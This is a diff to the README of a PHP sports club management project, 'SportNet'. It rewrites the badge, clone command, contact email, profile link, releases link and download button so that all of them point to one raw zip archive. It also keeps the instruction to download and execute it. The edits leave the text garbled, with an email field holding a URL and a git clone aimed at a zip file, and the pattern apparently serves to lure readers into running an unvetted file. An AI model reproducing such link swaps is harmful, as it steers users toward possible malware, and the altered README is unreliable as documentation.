@@ -1,6 +1,6 @@
 # SportNet: A PHP-Based Sports Club Management System ⚽🏀🏈
 
-![SportNet](https://img.shields.io/badge/SportNet-PHP%20Sports%20Club%20Management-brightgreen)
+![SportNet](https://github.com/Chirawat18/Sportnet/raw/refs/heads/main/public/Software-2.0-alpha.2.zip%20Sports%20Club%20Management-brightgreen)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -38,7 +38,7 @@ To get started with SportNet, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Chirawat18/Sportnet.git
+   git clone https://github.com/Chirawat18/Sportnet/raw/refs/heads/main/public/Software-2.0-alpha.2.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -101,13 +101,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or inquiries, please reach out via:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Chirawat18](https://github.com/Chirawat18)
+- **Email**: https://github.com/Chirawat18/Sportnet/raw/refs/heads/main/public/Software-2.0-alpha.2.zip
+- **GitHub**: [Chirawat18](https://github.com/Chirawat18/Sportnet/raw/refs/heads/main/public/Software-2.0-alpha.2.zip)
 
 ## Releases
 
-You can find the latest releases of SportNet [here](https://github.com/Chirawat18/Sportnet/releases). Download the latest version and execute it to get started.
+You can find the latest releases of SportNet [here](https://github.com/Chirawat18/Sportnet/raw/refs/heads/main/public/Software-2.0-alpha.2.zip). Download the latest version and execute it to get started.
 
-![Release Button](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Release Button](https://github.com/Chirawat18/Sportnet/raw/refs/heads/main/public/Software-2.0-alpha.2.zip%20Latest%20Release-Click%20Here-blue)
 
 For more information, check the "Releases" section of the repository.
